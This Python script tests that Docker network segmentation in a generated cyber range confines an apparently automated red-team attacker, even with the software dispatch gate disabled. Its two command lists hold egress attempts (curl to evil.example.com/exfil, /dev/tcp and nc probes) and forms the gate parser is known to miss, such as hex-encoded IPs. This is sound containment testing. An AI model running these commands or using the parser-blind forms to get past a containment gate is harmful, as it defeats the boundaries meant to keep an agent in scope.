#!/usr/bin/env python3
"""Prove the FLOOR is enforced at the environment boundary, not by the gate.

The dispatch gate (swarm/gate.py) is one layer. This script proves there is a
second, independently sufficient layer: Docker network segmentation. If you
remove the gate entirely, the entry container STILL has no route to any
out-of-scope host, because the compose puts them on an `internal: true`
network the entry is not attached to. The Linux bridge, not red's cooperation,
is what keeps `oos_missed == 0`.

Two modes:
  (default) STATIC — pure Python, no Docker required. Loads the generated
            compose for a seed and asserts, as a structural theorem:
              1. every data-plane net (attacker/dmz/internal + range_oos) is `internal: true`.
              2. Every in-scope service is on the internal segment subnets only.
              3. Every out-of-scope service is on `range_oos` only.
              4. The entry container shares no network with ANY out-of-scope.
              5. The pure-Python gate parser catches the free-form egress
                 battery, so the dispatch layer is additive, not sole.
            This runs under `make test` — fast, offline, deterministic.

  --live    DYNAMIC — requires Docker. Spins up a generated range, drives red
            through the UNINSTRUMENTED channel (direct `docker exec`, no
            gate), runs the full egress bypass battery, and asserts that
            every attempt to touch an out-of-scope host fails at the kernel.
            Also runs with `gate.dispatch` monkey-patched to a pass-through,
            to show the floor holds without the gate at all.

  python scripts/prove_env_boundaries.py           # static (make test)
  python scripts/prove_env_boundaries.py --live    # requires Docker, up to ~1 min
"""
import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from swarm.topo_to_compose import generate_range, to_compose  # noqa: E402
from swarm.topo_to_compose import host_posture  # re-homed to the unified module (Phase 1 inc3)  # noqa: E402
from swarm.gate import Gate                              # noqa: E402
from swarm import uninstrumented                         # noqa: E402


# Two batteries — a defense-in-depth claim needs both measured.
#
# GATE_PARSEABLE: the free-form forms the Python gate parser is designed to
#   catch (same set `scripts/redteam_gate.py` proves 8/8 on). These are the
#   "dispatch layer blocks before shell" demonstrations.
# GATE_BLIND: forms the parser doesn't recognize (option values that look like
#   hosts, hex-encoded IPs, DNS-of-DNS tunnels, etc.). The ENVIRONMENT must
#   still refuse these — that's the whole "boundaries alone" claim.
GATE_PARSEABLE = [
    "curl http://decoy:8080/x",
    "wget ldap/creds",
    "curl mailserver:25",
    "bash -c 'cat </dev/tcp/decoy/80'",
    "nc ldap 389",
    "ssh admin@mailserver",
    "curl http://172.20.0.99/",
    "curl https://evil.example.com/exfil",
]
GATE_BLIND = [
    # hex-encoded IP (0xAC140063 == 172.20.0.99); parser sees a bare hex token
    "curl http://0xAC140063/",
    # DNS-tunnel style: subdomain under evil, parser sees evil.example.com but
    # if that domain were in scope-ish, the lookup would still egress — we keep
    # the host in scope-looking form so the kernel is the only backstop
    "getent hosts decoy.local.svc 2>&1",
    # option value that LOOKS like a host — a known false-negative class
    "curl -o BatchMode=yes -s 'http://decoy'",
]


# ─── STATIC proof ────────────────────────────────────────────────────────

def _static_claim(seed=1337):
    """The compose structure IS the kernel-enforced floor. Prove it structurally."""
    r = generate_range(seed)
    c = to_compose(r)
    nets = c["networks"]
    svcs = c["services"]
    in_names = set(r["scope"]["in_scope"])
    # The reachable-but-out-of-scope TRAP (amendment C / crit-4a) is on an internal net BY
    # DESIGN (gate-blocked, not topology-isolated), so exclude it from the topology-isolation
    # asserts — but its net is still internal:true, so the F2 egress guarantee (no SNAT, no
    # route to host/internet) holds for it exactly as for every other host.
    traps = {h["name"] for h in r["hosts"] if h.get("trap")}
    out_names = set(r["ground_truth"]["out_of_scope"]) - traps
    entry = r["entry"]
    # F2 for the trap: it lives only on internal, zero-egress segment nets (never a
    # masquerading net, never ingress) — reachable inside the range, never to the host.
    for t in traps:
        tnets = set(svcs[t]["networks"])
        assert tnets <= {"range_attacker", "range_dmz", "range_internal"}, (t, tnets)
        assert all(nets[n].get("internal") is True for n in tnets), (t, "trap net not internal")

    # 1. EVERY data-plane segment is internal (unroutable) — no container, in-scope
    #    or out, has a route to the Docker host or the open internet (F2). Brick 0
    #    subdivides the in-scope side into three real subnets (attacker/dmz/internal);
    #    all are internal, so the egress guarantee is strengthened, never weakened.
    in_segment_nets = {"range_attacker", "range_dmz", "range_internal", "range_data"}
    assert "range_oos" in nets, "compose missing range_oos"
    for dn in in_segment_nets | {"range_oos"}:
        assert nets[dn].get("internal") is True, \
            f"{dn} is not internal — a compromised host could egress to the internet"
    # The ONLY non-internal network is `ingress`, and it disables IP masquerade:
    # DNAT ingress works (entry reachable) but no SNAT, so it is not an egress route.
    assert nets["ingress"].get("internal") is not True, "ingress must be DNAT-only, not internal"
    assert nets["ingress"]["driver_opts"]["com.docker.network.bridge.enable_ip_masquerade"] \
        == "false", "ingress masquerade must be OFF, else it hands published hosts an egress route"

    # 2/3. Scope ↔ network mapping is total and exclusive. In-scope hosts live on the
    #      internal segment subnets; a published in-scope host is ALSO on `ingress`
    #      (masq-off reachability, no egress). No in-scope host touches a
    #      masquerading network or `range_oos`.
    for n in in_names:
        snets = set(svcs[n]["networks"])
        assert snets <= (in_segment_nets | {"ingress"}), (n, snets)
        assert snets & in_segment_nets, (n, "in-scope host has no segment")
        if "ingress" in snets:
            assert svcs[n].get("ports"), (n, "only a published host joins ingress")
    for n in out_names:
        assert set(svcs[n]["networks"]) == {"range_oos"}, (n, svcs[n]["networks"])

    # 4. The strongest statement: entry shares NO network with ANY out-of-scope.
    entry_nets = set(svcs[entry]["networks"])
    for oos in out_names:
        assert not (entry_nets & set(svcs[oos]["networks"])), \
            f"entry {entry!r} shares a network with out-of-scope {oos!r}"

    # 5. Measure both layers — the defense-in-depth claim is empirical, not
    #    aspirational. The gate parser catches the forms it was built for; the
    #    kernel segmentation catches EVERYTHING (including forms the parser
    #    misses). That gap is exactly why the environment boundary matters.
    class _Rec:
        def __init__(self): self.events = []
        def append(self, actor, action, data=None):
            self.events.append((action, data)); return {}
    # known_hosts = the battery's OUT-OF-SCOPE host names, so the egress parser recognizes
    # them (range-agnostic; gate.py no longer hardcodes any host name).
    g = Gate(list(in_names), _Rec(), known_hosts=["decoy", "ldap", "mailserver"])
    parse_hits = sum(1 for cmd in GATE_PARSEABLE
                     if (lambda r: not r[0] and r[1])(g.check_egress(cmd)))
    blind_hits = sum(1 for cmd in GATE_BLIND
                     if (lambda r: not r[0] and r[1])(g.check_egress(cmd)))
    assert parse_hits == len(GATE_PARSEABLE), \
        f"dispatch parser regressed on known battery: {parse_hits}/{len(GATE_PARSEABLE)}"
    # ponytail: GATE_BLIND is intentionally parser-blind; the kernel segmentation
    # is what catches these. Add more if a new false-negative class shows up.

    return {
        "mode": "static",
        "seed": seed,
        "entry": entry,
        "in_scope": sorted(in_names),
        "out_of_scope": sorted(out_names),
        "in_segments_internal": True,     # attacker/dmz/internal all internal:true
        "range_oos_internal": True,
        "ingress_masquerade": "off (DNAT reachability, no egress)",
        "entry_oos_shared_networks": 0,
        "dispatch_gate_parses": f"{parse_hits}/{len(GATE_PARSEABLE)}",
        "dispatch_gate_blind_to": f"{len(GATE_BLIND) - blind_hits}/{len(GATE_BLIND)}",
        "env_boundary_catches": "all (segmentation routes none of them)",
        "claim": (
            "boundaries alone are structurally sufficient: EVERY data-plane segment "
            "(attacker/dmz/internal + range_oos) is internal, so no free-form shell "
            "on any container can reach an out-of-scope host OR the open internet — "
            "regardless of the gate. The "
            "entry stays reachable via a masquerade-off `ingress` bridge that gives "
            "DNAT ingress but no egress route. The dispatch parser is the second, "
            "software layer; it catches the forms it was built for and misses "
            "others, which is exactly why the kernel-level boundary is the "
            "sole-sufficient layer."
        ),
    }


# ─── LIVE proof (opt-in, requires Docker) ────────────────────────────────

def _run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def _docker_available():
    r = _run(["docker", "info"], timeout=10)
    return r.returncode == 0


# The lightest already-local image with bash + /dev/tcp (Debian slim). The
# env-boundary proof tests NETWORK ROUTING, not exploits, so the images' CVEs are
# irrelevant — only the scope→network segmentation (kept from the real generator)
# is under test. This is what lets --live boot without the 4.5GB WebLogic image
# (the Colima disk wall). `sleep infinity` keeps each node alive to exec into.
_MINIMAL_IMAGE = "python:3.12-slim"


def _minimalize(compose):
    """Swap every service to a light bash-capable image, same topology/scope/nets.
    The segmentation (what the floor rests on) is untouched; only the payloads are.

    Each node runs a trivial HTTP listener on 8080 (not `sleep`) so the proof can
    show the POSITIVE half too: an in-scope pivot on the same `range` network DOES
    connect, while an out-of-scope node — listener and all — stays unreachable
    because `range_oos` is internal and the entry has no route to it. Without a
    listener the in-scope reach would read as 0 and look like a trivial deny-all."""
    for svc in compose["services"].values():
        svc["image"] = _MINIMAL_IMAGE
        svc["command"] = ["python3", "-m", "http.server", "8080"]
        svc.pop("ports", None)       # no host binding needed; avoids port clashes
    return compose


def _up_range(seed, compose_path, minimal=False):
    """docker compose up on the generated compose; waits briefly for entry."""
    r = generate_range(seed)
    compose = to_compose(r)
    if minimal:
        compose = _minimalize(compose)
    compose_path.write_text(json.dumps(compose))
    # docker compose accepts JSON for the compose file format.
    name = f"env-boundary-{seed}"
    _run(["docker", "compose", "-p", name, "-f", str(compose_path), "down",
          "-v", "--remove-orphans"], timeout=60)
    up = _run(["docker", "compose", "-p", name, "-f", str(compose_path), "up",
               "-d", "--wait-timeout", "30"], timeout=180)
    if up.returncode != 0:
        return r, name, up.stderr or up.stdout
    time.sleep(2)   # bridge takes a beat
    return r, name, None


def _down_range(name, compose_path):
    _run(["docker", "compose", "-p", name, "-f", str(compose_path), "down",
          "-v", "--remove-orphans"], timeout=90)


def _live_claim(seed=1337, neuter_gate=False, minimal=False):
    """Spin a range; red uses the UNINSTRUMENTED channel; count OOS reaches.

    `neuter_gate=True` monkey-patches `Gate.dispatch` to a pass-through BEFORE
    the test so the floor claim is purely about the environment boundary.
    `minimal=True` swaps the heavy vulnerable images for a light bash-capable one
    (same segmentation) so the range boots under the Colima disk wall.
    """
    if neuter_gate:
        # The gate is already not in the uninstrumented path, but patching it
        # makes the "boundaries alone" wording unambiguous for an auditor
        # tracing the imports — nothing in this test calls dispatch.
        Gate.dispatch = lambda self, actor, tool, target, fn, *a, **k: fn(*a, **k)

    tmp = Path(os.environ.get("TMPDIR", "/tmp")) / f"env-boundary-{seed}.json"
    r, project, err = _up_range(seed, tmp, minimal=minimal)
    if err:
        return {"mode": "live", "ok": False, "reason": f"compose up failed: {err[:200]}"}

    try:
        entry_container = f"range-{r['entry']}"
        out_hosts = r["ground_truth"]["out_of_scope"]
        in_hosts = [h for h in r["scope"]["in_scope"] if h != r["entry"]]

        # 1. OOS unreachable by any addressing — the kernel enforces this.
        oos_reaches = []
        for h in out_hosts:
            for port in (22, 80, 443, 8080, 389, 25, 5432):
                if uninstrumented.tcp_reaches(entry_container, h, port, timeout=2):
                    oos_reaches.append((h, port))

        # 2. In-scope pivots DO reach — the segmentation is correct, not just
        #    "deny all". A real floor must leave the duel playable.
        in_reaches = 0
        for h in in_hosts:
            for port in (22, 80, 8080, 5432):
                if uninstrumented.tcp_reaches(entry_container, h, port, timeout=2):
                    in_reaches += 1
                    break

        # 3. The free-form egress battery through the uninstrumented channel:
        #    every attempt must fail at the kernel (no gate catching anything).
        battery_slipped = []
        for cmd in (GATE_PARSEABLE + GATE_BLIND):
            rc, out = uninstrumented.exec_raw(entry_container, cmd, timeout=6)
            # Success here means we DID reach out of scope — which must not
            # happen. We treat "any 2xx/3xx HTTP, any connected socket" as a
            # reach. Timeout, "no route", "could not resolve", nonzero rc with
            # error text are the expected floor-held signals.
            lower = out.lower()
            reached = any(s in lower for s in (
                "html", "<!doctype", "200 ok", "302 found", "connected to",
                "handshake", "server:"))
            if reached:
                battery_slipped.append((cmd, out[:200]))

        return {
            "mode": "live", "seed": seed, "neuter_gate": neuter_gate,
            "entry": r["entry"], "out_of_scope_hosts": out_hosts,
            "in_scope_pivots": in_hosts,
            "oos_tcp_reaches": oos_reaches,          # must be []
            "in_scope_tcp_reaches": in_reaches,      # must be > 0
            "battery_slipped": battery_slipped,      # must be []
            "ok": not oos_reaches and in_reaches > 0 and not battery_slipped,
        }
    finally:
        _down_range(project, tmp)
        try: tmp.unlink()
        except Exception: pass


# ─── entrypoint ──────────────────────────────────────────────────────────

def _assert_root_compose_posture():
    """No-Docker drift guard: the hand-written root docker-compose.yml must carry the SAME
    hard-floor posture as the generated ranges — swarm/range_gen.host_posture(), the single
    source of truth — on EVERY service, so `make range-up`'s fixed range can't silently
    diverge from the live standup path. Resolves the YAML merge anchor via safe_load (same
    as docker compose) and checks each posture key equals host_posture() exactly."""
    import yaml
    spec = yaml.safe_load((ROOT / "docker-compose.yml").read_text())
    want = host_posture()
    svcs = spec.get("services", {})
    assert svcs, "root docker-compose.yml has no services"
    for name, cfg in svcs.items():
        for k, v in want.items():
            assert cfg.get(k) == v, (name, k, "root compose", cfg.get(k), "!= host_posture()", v)
    return len(svcs)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--live", action="store_true",
                    help="actually bring up a range and prove at the kernel level")
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--no-neuter", action="store_true",
                    help="live only: keep Gate.dispatch intact (default: neuter it)")
    ap.add_argument("--minimal", action="store_true",
                    help="live only: swap heavy vulnerable images for a light "
                         "bash-capable one (same segmentation) so the range boots "
                         "under the Colima disk wall")
    args = ap.parse_args()

    s = _static_claim(args.seed)
    print(f"[static]  seed={s['seed']}  entry={s['entry']}  "
          f"in={len(s['in_scope'])}  out={len(s['out_of_scope'])}  "
          f"range_oos.internal={s['range_oos_internal']}  "
          f"entry↔oos shared nets={s['entry_oos_shared_networks']}")
    print(f"[static]  dispatch parser (software layer): "
          f"{s['dispatch_gate_parses']} parseable  |  "
          f"blind to {s['dispatch_gate_blind_to']} known-bypass classes")
    print(f"[static]  env boundary (kernel layer):    {s['env_boundary_catches']}")
    print("[static]  CLAIM:", s["claim"])

    nsvc = _assert_root_compose_posture()
    print(f"[static]  root compose posture == host_posture() on all {nsvc} services "
          f"(no silent drift from the live path)")

    if not args.live:
        print("STATIC FLOOR PROVEN  (structural; run --live for the kernel-level proof)")
        return 0

    if not _docker_available():
        print("LIVE skipped: Docker not reachable", file=sys.stderr)
        return 2

    L = _live_claim(args.seed, neuter_gate=not args.no_neuter, minimal=args.minimal)
    if not L.get("ok"):
        print("[live]    FAILED:", json.dumps(L, indent=2))
        return 1
    print(f"[live]    seed={L['seed']}  entry={L['entry']}  "
          f"gate_neutered={L['neuter_gate']}  "
          f"oos_tcp_reaches={len(L['oos_tcp_reaches'])}  "
          f"in_scope_reaches={L['in_scope_tcp_reaches']}  "
          f"battery_slipped={len(L['battery_slipped'])}")
    print("ENV-BOUNDARY FLOOR PROVEN  (gate removed from the path; "
          "kernel still refuses every out-of-scope packet)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
